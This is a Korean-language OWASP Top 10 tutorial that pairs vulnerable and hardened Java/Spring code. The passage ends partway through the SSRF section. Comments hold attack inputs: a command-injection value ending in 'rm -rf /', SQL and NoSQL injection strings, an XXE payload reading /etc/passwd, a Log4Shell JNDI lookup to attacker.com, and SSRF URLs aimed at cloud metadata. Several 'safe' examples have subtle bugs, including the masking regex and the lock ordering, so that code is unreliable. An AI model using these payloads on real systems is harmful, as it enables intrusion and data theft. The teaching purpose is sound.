# OWASP Top 10 웹 애플리케이션 보안 위험

## 목차
1. [개요](#개요)
2. [A01:2021 - Broken Access Control (접근 제어 취약점)](#a012021---broken-access-control-접근-제어-취약점)
3. [A02:2021 - Cryptographic Failures (암호화 실패)](#a022021---cryptographic-failures-암호화-실패)
4. [A03:2021 - Injection (인젝션)](#a032021---injection-인젝션)
5. [A04:2021 - Insecure Design (안전하지 않은 설계)](#a042021---insecure-design-안전하지-않은-설계)
6. [A05:2021 - Security Misconfiguration (보안 설정 오류)](#a052021---security-misconfiguration-보안-설정-오류)
7. [A06:2021 - Vulnerable and Outdated Components](#a062021---vulnerable-and-outdated-components)
8. [A07:2021 - Identification and Authentication Failures](#a072021---identification-and-authentication-failures)
9. [A08:2021 - Software and Data Integrity Failures](#a082021---software-and-data-integrity-failures)
10. [A09:2021 - Security Logging and Monitoring Failures](#a092021---security-logging-and-monitoring-failures)
11. [A10:2021 - Server-Side Request Forgery (SSRF)](#a102021---server-side-request-forgery-ssrf)
---

## 개요

OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 비영리 재단으로, 주기적으로 가장 심각한 웹 애플리케이션 보안 위험 10가지를 발표합니다. 최신 버전은 **OWASP Top 10:2021**이며, 2025년 11월에 OWASP Top 10:2025가 발표될 예정입니다.

### 2021 버전의 주요 변경사항

| 순위 | 2017 | 2021 | 변경 |
|------|------|------|------|
| 1 | Injection | Broken Access Control | 신규 1위 |
| 2 | Broken Authentication | Cryptographic Failures | 이름 변경 |
| 3 | Sensitive Data Exposure | Injection | 순위 하락 |
| 4 | XXE | Insecure Design | 신규 |
| 5 | Broken Access Control | Security Misconfiguration | XXE 통합 |
| 6 | Security Misconfiguration | Vulnerable Components | - |
| 7 | XSS | Authentication Failures | - |
| 8 | Insecure Deserialization | Software & Data Integrity | 확장 |
| 9 | Known Vulnerabilities | Logging & Monitoring Failures | - |
| 10 | Insufficient Logging | SSRF | 신규 |

---

## A01:2021 - Broken Access Control (접근 제어 취약점)

### 개념

접근 제어는 사용자가 의도된 권한을 벗어나 행동하지 못하도록 정책을 시행합니다. 이 취약점이 발생하면 권한이 없는 정보의 공개, 수정, 삭제 또는 사용자 권한 밖의 비즈니스 기능 수행으로 이어집니다.

### 취약점 유형

1. **수직적 권한 상승**: 일반 사용자가 관리자 기능에 접근
2. **수평적 권한 상승**: 다른 사용자의 데이터에 접근
3. **IDOR (Insecure Direct Object Reference)**: 직접 객체 참조를 통한 접근

### 취약한 코드 예제

```java
// 취약한 코드 - IDOR 취약점
@GetMapping("/api/users/{userId}/profile")
public UserProfile getUserProfile(@PathVariable Long userId) {
    // 현재 로그인한 사용자와 요청된 userId를 검증하지 않음
    return userRepository.findById(userId).orElseThrow();
}

// 취약한 코드 - 관리자 페이지 접근 제어 누락
@GetMapping("/admin/users")
public List<User> getAllUsers() {
    // 권한 검증 없이 모든 사용자 정보 반환
    return userRepository.findAll();
}
```

### 안전한 코드 예제

```java
// 안전한 코드 - 권한 검증 추가
@GetMapping("/api/users/{userId}/profile")
public UserProfile getUserProfile(
    @PathVariable Long userId,
    @AuthenticationPrincipal UserDetails currentUser
) {
    // 현재 사용자가 요청된 프로필에 접근 권한이 있는지 확인
    if (!currentUser.getId().equals(userId) && !currentUser.hasRole("ADMIN")) {
        throw new AccessDeniedException("접근 권한이 없습니다.");
    }
    return userRepository.findById(userId).orElseThrow();
}

// 안전한 코드 - Spring Security 어노테이션 사용
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/admin/users")
public List<User> getAllUsers() {
    return userRepository.findAll();
}

// 안전한 코드 - 메서드 레벨 보안
@PostAuthorize("returnObject.owner == authentication.name")
@GetMapping("/api/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentRepository.findById(id).orElseThrow();
}
```

### 방어 전략

```java
// 1. ABAC (Attribute-Based Access Control) 구현
@Component
public class DocumentAccessPolicy {

    public boolean canAccess(User user, Document document) {
        // 문서 소유자이거나
        if (document.getOwner().equals(user)) {
            return true;
        }

        // 같은 부서 + 읽기 권한이 있거나
        if (document.getDepartment().equals(user.getDepartment())
            && document.isSharedWithDepartment()) {
            return true;
        }

        // 명시적으로 공유된 사용자인 경우
        return document.getSharedUsers().contains(user);
    }
}

// 2. URL 기반 접근 제어 설정 (Spring Security)
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/users/*/profile").authenticated()
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        return http.build();
    }
}
```

---

## A02:2021 - Cryptographic Failures (암호화 실패)

### 개념

이전에는 "Sensitive Data Exposure"로 불렸으며, 암호화와 관련된 실패로 인해 민감한 데이터가 노출되는 취약점입니다.

### 취약점 유형

1. **평문 데이터 전송**: HTTPS 미사용
2. **약한 암호화 알고리즘**: MD5, SHA1, DES 사용
3. **하드코딩된 암호화 키**
4. **부적절한 키 관리**

### 취약한 코드 예제

```java
// 취약한 코드 - MD5로 비밀번호 해싱
public String hashPassword(String password) {
    MessageDigest md = MessageDigest.getInstance("MD5");
    byte[] hash = md.digest(password.getBytes());
    return Base64.getEncoder().encodeToString(hash);
}

// 취약한 코드 - 하드코딩된 암호화 키
public class EncryptionService {
    private static final String SECRET_KEY = "mySecretKey12345"; // 하드코딩됨

    public String encrypt(String data) {
        SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); // ECB 모드는 안전하지 않음
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        return Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes()));
    }
}

// 취약한 코드 - 민감한 데이터 평문 저장
@Entity
public class CreditCard {
    @Column
    private String cardNumber; // 평문 저장

    @Column
    private String cvv; // CVV는 저장하면 안됨
}
```

### 안전한 코드 예제

```java
// 안전한 코드 - Argon2id로 비밀번호 해싱
@Service
public class PasswordService {
    private final PasswordEncoder passwordEncoder;

    public PasswordService() {
        // Argon2id 사용 (Spring Security 5.3+)
        this.passwordEncoder = Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
    }

    public String hashPassword(String password) {
        return passwordEncoder.encode(password);
    }

    public boolean verifyPassword(String rawPassword, String hashedPassword) {
        return passwordEncoder.matches(rawPassword, hashedPassword);
    }
}

// 안전한 코드 - 환경 변수에서 키 로드 + AES-GCM 사용
@Service
public class EncryptionService {
    private final SecretKey secretKey;

    public EncryptionService(@Value("${encryption.key}") String base64Key) {
        byte[] keyBytes = Base64.getDecoder().decode(base64Key);
        this.secretKey = new SecretKeySpec(keyBytes, "AES");
    }

    public EncryptedData encrypt(String plainText) throws Exception {
        byte[] iv = new byte[12]; // GCM 권장 IV 크기
        SecureRandom.getInstanceStrong().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);

        byte[] cipherText = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));

        return new EncryptedData(
            Base64.getEncoder().encodeToString(iv),
            Base64.getEncoder().encodeToString(cipherText)
        );
    }

    public String decrypt(EncryptedData encryptedData) throws Exception {
        byte[] iv = Base64.getDecoder().decode(encryptedData.getIv());
        byte[] cipherText = Base64.getDecoder().decode(encryptedData.getCipherText());

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, secretKey, parameterSpec);

        return new String(cipher.doFinal(cipherText), StandardCharsets.UTF_8);
    }
}

// 안전한 코드 - 신용카드 데이터 처리
@Entity
public class PaymentInfo {
    @Column
    private String cardNumberMasked; // 마지막 4자리만 저장: ****-****-****-1234

    @Column
    private String cardTokenId; // PCI DSS 준수 토큰화 서비스 사용

    // CVV는 절대 저장하지 않음
}
```

---

## A03:2021 - Injection (인젝션)

### 개념

SQL, NoSQL, OS 명령어, LDAP 등의 인터프리터에 신뢰할 수 없는 데이터가 명령어나 쿼리의 일부로 전송될 때 발생합니다. 2021년 버전에서는 XSS도 이 카테고리에 포함되었습니다.

### 취약점 유형

1. **SQL Injection**
2. **NoSQL Injection**
3. **OS Command Injection**
4. **LDAP Injection**
5. **XPath Injection**
6. **Cross-Site Scripting (XSS)**

### 취약한 코드 예제

```java
// SQL Injection 취약 코드
public User findUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = '" + username
                 + "' AND password = '" + password + "'";
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}
// 공격: username = "admin'--", password = "anything"
// 결과 쿼리: SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

// OS Command Injection 취약 코드
public String executeCommand(String filename) {
    Runtime runtime = Runtime.getRuntime();
    Process process = runtime.exec("cat /uploads/" + filename);
    return readOutput(process);
}
// 공격: filename = "file.txt; rm -rf /"

// NoSQL Injection 취약 코드 (MongoDB)
public User findUser(String username, String password) {
    Document query = Document.parse(
        "{\"username\": \"" + username + "\", \"password\": \"" + password + "\"}"
    );
    return collection.find(query).first();
}
// 공격: username = "{\"$gt\": \"\"}", password = "{\"$gt\": \"\"}"
```

### 안전한 코드 예제

```java
// 안전한 코드 - PreparedStatement 사용
public User findUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    return jdbcTemplate.queryForObject(
        query,
        new UserRowMapper(),
        username,
        passwordEncoder.encode(password)
    );
}

// 안전한 코드 - JPA 사용
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.username = :username")
    Optional<User> findByUsername(@Param("username") String username);
}

// 안전한 코드 - OS 명령 실행 시 화이트리스트 검증
public String readFile(String filename) {
    // 파일명 검증 (영문, 숫자, 점, 하이픈만 허용)
    if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
        throw new IllegalArgumentException("Invalid filename");
    }

    // 경로 순회 방지
    Path basePath = Paths.get("/uploads").toAbsolutePath().normalize();
    Path filePath = basePath.resolve(filename).normalize();

    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }

    return Files.readString(filePath);
}

// 안전한 코드 - MongoDB (파라미터 바인딩)
public User findUser(String username, String password) {
    Query query = new Query();
    query.addCriteria(Criteria.where("username").is(username)
                              .and("password").is(password));
    return mongoTemplate.findOne(query, User.class);
}

// XSS 방어 - 출력 인코딩
@Component
public class HtmlSanitizer {
    private final PolicyFactory policy = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS)
        .and(Sanitizers.BLOCKS);

    public String sanitize(String untrustedHtml) {
        return policy.sanitize(untrustedHtml);
    }
}
```

---

## A04:2021 - Insecure Design (안전하지 않은 설계)

### 개념

2021년에 새로 추가된 카테고리로, 설계 및 아키텍처 결함에 초점을 맞춥니다. 완벽한 구현으로도 수정할 수 없는 설계 단계의 보안 결함을 다룹니다.

### 안전하지 않은 설계 예시

```java
// 안전하지 않은 설계 - 비밀번호 재설정 토큰이 예측 가능
public class PasswordResetService {
    public String generateResetToken(User user) {
        // 취약: 순차적이고 예측 가능한 토큰
        return String.valueOf(System.currentTimeMillis());
    }
}

// 안전하지 않은 설계 - 무제한 API 호출
@RestController
public class LoginController {
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        // 취약: 로그인 시도 횟수 제한 없음 (브루트포스 가능)
        return authService.authenticate(request);
    }
}

// 안전하지 않은 설계 - 비즈니스 로직 결함
public class TransferService {
    public void transfer(Account from, Account to, BigDecimal amount) {
        // 취약: 동시성 제어 없음 (레이스 컨디션)
        if (from.getBalance().compareTo(amount) >= 0) {
            from.setBalance(from.getBalance().subtract(amount));
            to.setBalance(to.getBalance().add(amount));
        }
    }
}
```

### 안전한 설계 예시

```java
// 안전한 설계 - 암호학적으로 안전한 토큰
@Service
public class PasswordResetService {
    private final SecureRandom secureRandom = new SecureRandom();
    private final TokenRepository tokenRepository;

    public String generateResetToken(User user) {
        byte[] tokenBytes = new byte[32];
        secureRandom.nextBytes(tokenBytes);
        String token = Base64.getUrlEncoder().withoutPadding()
                            .encodeToString(tokenBytes);

        PasswordResetToken resetToken = PasswordResetToken.builder()
            .token(hashToken(token))
            .userId(user.getId())
            .expiresAt(Instant.now().plus(Duration.ofHours(1)))
            .build();

        tokenRepository.save(resetToken);
        return token;
    }

    private String hashToken(String token) {
        return Hashing.sha256()
            .hashString(token, StandardCharsets.UTF_8)
            .toString();
    }
}

// 안전한 설계 - 레이트 리미팅 적용
@RestController
public class LoginController {
    private final RateLimiter rateLimiter;
    private final LoginAttemptService loginAttemptService;

    @PostMapping("/login")
    public ResponseEntity<?> login(
        @RequestBody LoginRequest request,
        HttpServletRequest httpRequest
    ) {
        String clientIp = getClientIP(httpRequest);

        // IP 기반 레이트 리미팅
        if (loginAttemptService.isBlocked(clientIp)) {
            throw new TooManyRequestsException("너무 많은 로그인 시도입니다.");
        }

        // 계정 기반 레이트 리미팅
        if (loginAttemptService.isAccountLocked(request.getUsername())) {
            throw new AccountLockedException("계정이 일시적으로 잠겼습니다.");
        }

        try {
            Authentication auth = authService.authenticate(request);
            loginAttemptService.loginSucceeded(clientIp, request.getUsername());
            return ResponseEntity.ok(auth);
        } catch (BadCredentialsException e) {
            loginAttemptService.loginFailed(clientIp, request.getUsername());
            throw e;
        }
    }
}

// 안전한 설계 - 트랜잭션과 락을 사용한 이체
@Service
@Transactional
public class TransferService {
    private final AccountRepository accountRepository;

    public void transfer(Long fromId, Long toId, BigDecimal amount) {
        // 낙관적 락 또는 비관적 락 사용
        Account from = accountRepository.findByIdWithLock(fromId)
            .orElseThrow(() -> new AccountNotFoundException(fromId));
        Account to = accountRepository.findByIdWithLock(toId)
            .orElseThrow(() -> new AccountNotFoundException(toId));

        // 데드락 방지를 위해 ID 순서로 락 획득
        if (fromId > toId) {
            Account temp = from;
            from = to;
            to = temp;
        }

        from.withdraw(amount); // 잔액 부족 시 예외 발생
        to.deposit(amount);

        // 감사 로그 기록
        auditService.logTransfer(fromId, toId, amount);
    }
}
```

---

## A05:2021 - Security Misconfiguration (보안 설정 오류)

### 개념

보안 설정이 잘못되거나, 불필요한 기능이 활성화되어 있거나, 기본 계정/비밀번호가 변경되지 않은 경우 발생합니다. 2021년 버전에서는 XML External Entities (XXE)가 이 카테고리에 통합되었습니다.

### 일반적인 설정 오류

```yaml
# 취약한 Spring Boot 설정
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/mydb
    username: root
    password: root  # 기본 비밀번호 사용

  # 프로덕션에서 H2 콘솔 활성화
  h2:
    console:
      enabled: true

# 디버그 모드 활성화
debug: true

# Actuator 엔드포인트 전체 노출
management:
  endpoints:
    web:
      exposure:
        include: "*"
```

### XXE (XML External Entities) 취약점

```java
// XXE 취약 코드
public Document parseXml(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}

/*
공격 페이로드:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
*/
```

### 안전한 설정

```yaml
# 안전한 Spring Boot 프로덕션 설정
spring:
  datasource:
    url: ${DATABASE_URL}
    username: ${DATABASE_USER}
    password: ${DATABASE_PASSWORD}

  h2:
    console:
      enabled: false

  # 에러 상세 정보 숨김
  mvc:
    throw-exception-if-no-handler-found: true
  web:
    resources:
      add-mappings: false

# 디버그 비활성화
debug: false

# 필요한 Actuator 엔드포인트만 노출
management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics
  endpoint:
    health:
      show-details: when_authorized
```

```java
// XXE 방어 코드
public Document parseXmlSafely(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    // XXE 방어 설정
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);

    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}

// Spring Security 헤더 설정
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp ->
                    csp.policyDirectives("default-src 'self'; script-src 'self'"))
                .frameOptions(frame -> frame.deny())
                .xssProtection(xss -> xss.headerValue(
                    XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .contentTypeOptions(Customizer.withDefaults())
                .referrerPolicy(referrer ->
                    referrer.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
                .permissionsPolicy(permissions ->
                    permissions.policy("geolocation=(), microphone=(), camera=()"))
            );
        return http.build();
    }
}
```

---

## A06:2021 - Vulnerable and Outdated Components

### 개념

취약점이 알려진 컴포넌트(라이브러리, 프레임워크)를 사용하거나 더 이상 지원되지 않는 버전을 사용할 때 발생합니다.

### 의존성 관리 전략

```xml
<!-- Maven - OWASP Dependency-Check 플러그인 -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.7</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFiles>
            <suppressionFile>dependency-check-suppression.xml</suppressionFile>
        </suppressionFiles>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

```groovy
// Gradle - 의존성 업데이트 확인
plugins {
    id 'com.github.ben-manes.versions' version '0.50.0'
}

dependencyUpdates {
    rejectVersionIf {
        isNonStable(it.candidate.version) && !isNonStable(it.currentVersion)
    }
}

def isNonStable(String version) {
    def stableKeyword = ['RELEASE', 'FINAL', 'GA'].any {
        version.toUpperCase().contains(it)
    }
    def regex = /^[0-9,.v-]+(-r)?$/
    return !stableKeyword && !(version ==~ regex)
}
```

```java
// 취약한 라이브러리 사용 예시 (Log4j 2.14.1 - Log4Shell 취약점)
// CVE-2021-44228
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableLogging {
    private static final Logger logger = LogManager.getLogger();

    public void logUserInput(String userInput) {
        // 취약: 사용자 입력을 그대로 로깅
        logger.info("User input: " + userInput);
        // 공격: ${jndi:ldap://attacker.com/exploit}
    }
}

// 안전한 코드 - Log4j 2.17.1+ 사용 및 입력 검증
public class SafeLogging {
    private static final Logger logger = LogManager.getLogger();

    public void logUserInput(String userInput) {
        // 파라미터 바인딩 사용 (JNDI 룩업 방지)
        logger.info("User input: {}",
            userInput.replaceAll("[\\$\\{\\}]", "_"));
    }
}
```

---

## A07:2021 - Identification and Authentication Failures

### 개념

이전의 "Broken Authentication"으로, 사용자 인증 및 세션 관리 관련 취약점을 다룹니다.

### 취약한 인증 구현

```java
// 취약한 코드 - 약한 비밀번호 정책
public boolean validatePassword(String password) {
    return password.length() >= 4; // 너무 약한 정책
}

// 취약한 코드 - 세션 고정 공격에 취약
@PostMapping("/login")
public String login(HttpSession session, @RequestBody LoginRequest request) {
    if (authService.authenticate(request)) {
        // 취약: 로그인 후에도 같은 세션 ID 유지
        session.setAttribute("user", request.getUsername());
        return "redirect:/dashboard";
    }
    return "redirect:/login?error";
}

// 취약한 코드 - 비밀번호 평문 비교
public boolean checkPassword(String rawPassword, String storedPassword) {
    return rawPassword.equals(storedPassword); // 평문 비교
}
```

### 안전한 인증 구현

```java
// 안전한 비밀번호 정책
@Service
public class PasswordPolicyService {

    public void validatePassword(String password) {
        List<String> violations = new ArrayList<>();

        if (password.length() < 12) {
            violations.add("비밀번호는 최소 12자 이상이어야 합니다.");
        }

        if (!password.matches(".*[A-Z].*")) {
            violations.add("대문자를 포함해야 합니다.");
        }

        if (!password.matches(".*[a-z].*")) {
            violations.add("소문자를 포함해야 합니다.");
        }

        if (!password.matches(".*[0-9].*")) {
            violations.add("숫자를 포함해야 합니다.");
        }

        if (!password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
            violations.add("특수문자를 포함해야 합니다.");
        }

        // 일반적인 비밀번호 확인
        if (commonPasswordChecker.isCommon(password)) {
            violations.add("너무 일반적인 비밀번호입니다.");
        }

        if (!violations.isEmpty()) {
            throw new WeakPasswordException(violations);
        }
    }
}

// 세션 고정 공격 방어
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement(session -> session
                .sessionFixation().newSession() // 로그인 시 새 세션 생성
                .maximumSessions(1) // 동시 세션 제한
                .maxSessionsPreventsLogin(false) // 이전 세션 무효화
                .expiredSessionStrategy(event -> {
                    event.getResponse().sendRedirect("/session-expired");
                })
            )
            .formLogin(form -> form
                .successHandler((request, response, authentication) -> {
                    // 인증 성공 시 세션 속성 설정
                    HttpSession session = request.getSession(false);
                    session.setAttribute("lastLoginTime", Instant.now());
                    session.setAttribute("loginIp", request.getRemoteAddr());
                })
            );
        return http.build();
    }
}

// MFA (Multi-Factor Authentication) 구현
@Service
public class TwoFactorAuthService {

    public String generateTotpSecret() {
        byte[] buffer = new byte[20];
        new SecureRandom().nextBytes(buffer);
        return Base32.encode(buffer);
    }

    public boolean verifyTotp(String secret, String code) {
        GoogleAuthenticator gAuth = new GoogleAuthenticator();
        return gAuth.authorize(secret, Integer.parseInt(code));
    }
}
```

---

## A08:2021 - Software and Data Integrity Failures

### 개념

2021년에 새로 추가된 카테고리로, 이전의 "Insecure Deserialization"을 확장하여 소프트웨어 업데이트, CI/CD 파이프라인, 역직렬화 관련 무결성 문제를 다룹니다.

### Insecure Deserialization 취약점

```java
// 취약한 코드 - 신뢰할 수 없는 데이터 역직렬화
@PostMapping("/import")
public void importData(@RequestBody byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject(); // 위험: RCE 가능
    processData(obj);
}

/*
공격자는 악성 직렬화된 객체를 전송하여 서버에서 임의 코드 실행 가능
예: Apache Commons Collections의 InvokerTransformer를 이용한 gadget chain
*/
```

### 안전한 구현

```java
// 안전한 코드 - JSON 사용
@PostMapping("/import")
public void importData(@RequestBody ImportDataRequest request) {
    // Jackson ObjectMapper가 안전하게 역직렬화
    processData(request);
}

// 역직렬화가 필요한 경우 - 화이트리스트 필터 적용
public class SecureObjectInputStream extends ObjectInputStream {

    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.dto.UserData",
        "com.myapp.dto.OrderData",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException(
                "Unauthorized deserialization attempt: " + desc.getName()
            );
        }
        return super.resolveClass(desc);
    }
}

// CI/CD 파이프라인 무결성 보호
@Configuration
public class ArtifactVerificationConfig {

    @Bean
    public ArtifactVerifier artifactVerifier() {
        return new ArtifactVerifier() {
            @Override
            public boolean verify(Artifact artifact, String expectedChecksum) {
                String actualChecksum = calculateSha256(artifact.getData());
                return MessageDigest.isEqual(
                    expectedChecksum.getBytes(),
                    actualChecksum.getBytes()
                );
            }
        };
    }
}
```

### Subresource Integrity (SRI) 적용

```html
<!-- CDN에서 로드하는 스크립트의 무결성 검증 -->
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

---

## A09:2021 - Security Logging and Monitoring Failures

### 개념

이전의 "Insufficient Logging & Monitoring"으로, 로깅과 모니터링이 부족하면 공격 탐지가 어려워지고, 사고 대응이 지연됩니다.

### 로깅 전략

```java
// 보안 이벤트 로깅 서비스
@Service
@Slf4j
public class SecurityAuditService {

    private final AuditEventRepository auditEventRepository;

    public void logAuthenticationSuccess(String username, String ip) {
        log.info("SECURITY_EVENT: Authentication success - user={}, ip={}",
            username, ip);

        saveAuditEvent(SecurityEventType.AUTH_SUCCESS, username, ip, null);
    }

    public void logAuthenticationFailure(String username, String ip, String reason) {
        log.warn("SECURITY_EVENT: Authentication failure - user={}, ip={}, reason={}",
            username, ip, reason);

        saveAuditEvent(SecurityEventType.AUTH_FAILURE, username, ip,
            Map.of("reason", reason));
    }

    public void logAccessDenied(String username, String resource, String action) {
        log.warn("SECURITY_EVENT: Access denied - user={}, resource={}, action={}",
            username, resource, action);

        saveAuditEvent(SecurityEventType.ACCESS_DENIED, username, null,
            Map.of("resource", resource, "action", action));
    }

    public void logSuspiciousActivity(String username, String ip, String description) {
        log.error("SECURITY_EVENT: Suspicious activity - user={}, ip={}, description={}",
            username, ip, description);

        saveAuditEvent(SecurityEventType.SUSPICIOUS_ACTIVITY, username, ip,
            Map.of("description", description));

        // 심각한 이벤트는 즉시 알림
        alertService.sendSecurityAlert(username, description);
    }

    private void saveAuditEvent(
        SecurityEventType type,
        String username,
        String ip,
        Map<String, String> metadata
    ) {
        AuditEvent event = AuditEvent.builder()
            .eventType(type)
            .username(username)
            .ipAddress(ip)
            .timestamp(Instant.now())
            .metadata(metadata)
            .build();

        auditEventRepository.save(event);
    }
}

// 로깅해야 할 보안 이벤트
public enum SecurityEventType {
    AUTH_SUCCESS,           // 로그인 성공
    AUTH_FAILURE,           // 로그인 실패
    LOGOUT,                 // 로그아웃
    PASSWORD_CHANGE,        // 비밀번호 변경
    PASSWORD_RESET,         // 비밀번호 재설정
    MFA_ENABLED,           // MFA 활성화
    MFA_DISABLED,          // MFA 비활성화
    ACCESS_DENIED,         // 접근 거부
    PRIVILEGE_ESCALATION,  // 권한 상승 시도
    DATA_EXPORT,           // 대량 데이터 조회/내보내기
    ADMIN_ACTION,          // 관리자 작업
    SUSPICIOUS_ACTIVITY,   // 의심스러운 활동
    SESSION_TIMEOUT,       // 세션 타임아웃
    CONCURRENT_SESSION     // 동시 세션 감지
}

// 민감 정보 마스킹
@Component
public class LogMaskingConverter {

    private static final Pattern CREDIT_CARD =
        Pattern.compile("\\b\\d{4}[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4}\\b");
    private static final Pattern SSN =
        Pattern.compile("\\b\\d{6}[- ]?\\d{7}\\b");
    private static final Pattern PASSWORD =
        Pattern.compile("(password|pwd|passwd)\\s*[=:]\\s*\\S+", Pattern.CASE_INSENSITIVE);

    public String mask(String message) {
        String masked = message;
        masked = CREDIT_CARD.matcher(masked).replaceAll("****-****-****-$1");
        masked = SSN.matcher(masked).replaceAll("******-*******");
        masked = PASSWORD.matcher(masked).replaceAll("$1=*****");
        return masked;
    }
}
```

### 모니터링 및 알림 설정

```yaml
# Prometheus 알림 규칙
groups:
  - name: security_alerts
    rules:
      - alert: HighAuthenticationFailureRate
        expr: |
          sum(rate(auth_failures_total[5m]))
          / sum(rate(auth_attempts_total[5m])) > 0.3
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "높은 인증 실패율 감지"
          description: "최근 5분간 인증 실패율이 30%를 초과했습니다."

      - alert: BruteForceAttack
        expr: |
          sum by (ip) (rate(auth_failures_total[1m])) > 10
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "브루트포스 공격 의심"
          description: "IP {{ $labels.ip }}에서 분당 10회 이상 로그인 실패"
```

---

## A10:2021 - Server-Side Request Forgery (SSRF)

### 개념

2021년에 새로 추가된 카테고리로, 서버가 사용자 제공 URL을 검증 없이 요청할 때 발생합니다.

### 취약한 코드

```java
// SSRF 취약 코드
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws Exception {
    // 취약: 사용자 입력 URL을 검증 없이 요청
    URL targetUrl = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
    return readResponse(conn);
}

// 공격 예시:
// /fetch?url=http://169.254.169.254/latest/meta-data/  (AWS 메타데이터)
// /fetch?url=http://localhost:8080/admin  (내부 서비스 접근)
// /fetch?url=file:///etc/passwd  (로컬 파일 읽기)
```

### 안전한 코드

```java
@Service
public class SafeUrlFetcher {

    private static final Set<String> ALLOWED_HOSTS = Set.of(
        "api.trusted-service.com",
        "cdn.example.com"
    );

    private static final Set<String> BLOCKED_IP_RANGES = Set.of(
        "127.0.0.0/8",      // Loopback
        "10.0.0.0/8",       // Private
        "172.16.0.0/12",    // Private
        "192.168.0.0/16",   // Private
        "169.254.0.0/16",   // Link-local (AWS metadata)
        "0.0.0.0/8"         // This network
    );

    public String fetchUrl(String urlString) throws Exception {
        URL url = new URL(urlString);

        // 1. 프로토콜 검증
        if (!Set.of("http", "https").contains(url.getProtocol())) {
            throw new SecurityException("허용되지 않은 프로토콜: " + url.getProtocol());
        }

        // 2. 호스트 화이트리스트 검증
        if (!ALLOWED_HOSTS.contains(url.getHost())) {
            throw new SecurityException("허용되지 않은 호스트: " + url.getHost());
        }

        // 3. DNS Rebinding 방어 - IP 주소 직접 확인
